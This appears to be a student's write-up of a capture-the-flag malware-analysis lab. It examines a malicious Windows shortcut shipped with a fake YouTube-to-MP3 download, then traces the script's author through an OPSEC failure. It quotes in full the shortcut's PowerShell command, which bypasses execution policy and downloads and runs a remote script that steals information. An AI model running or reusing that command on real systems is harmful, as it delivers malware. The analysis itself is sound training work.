For this challenge, I had to analyze the files downloaded from a youtube to mp3 converter website (which are notorious for phishing scams, malware).

After evading a rickroll that I saw coming from a mile away, I ran the `file` command on both the files extracted from the zip downloaded from the website. One was an audio file whereas the other was a MS Windows shortcut, a .lnk file, which is used to link to another file or folder in Windows _and_ can also be used to run commands.

To inspect this .lnk file, we were given the preinstalled `exiftool` tool. I ran it on the `somg.mp3` file and examined the code:

```
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```
Here, `-ep Bypass` is used to disable shell restrictions that allows the script to run without any security intereferences.

`DownloadFile` downloads the IS.ps1 file from the github repository linked after it onto the ProgramData folder.

After that, the script is executed by `iex which triggers the s.ps1 file.

By checking the file itself in a browser, we can see that the script was designed to collect sensitive information. However, there was a crucial error made in the script which was that it was signed off by "M.M"

By searching for that signature on github, we can find this code being discussed on a public forum with another user named Bloatware-WarewillTHM.

This is the mistake made by M.M. They left traces of their work which allowed us to track them down easily, and this is the key concept behind OPSEC failure.

OPSEC refers to the process of protecting sensitive information from adversaries with the goal being to identify and eliminate potential threats before the attacker can learn their identity. In context of CyberSec, it refers to malicious actors that fail to follow proper OPSEC practices, thereby leaving traces that can be tracked down to reveal their identity. Here, the OPSEC mistake made by M.M was posting on a public forum with the same username. 

Now that we have M.M's profile, we can find out their true identity by digging around a little more in their github which has a repository "M.M" that reveals his identity.
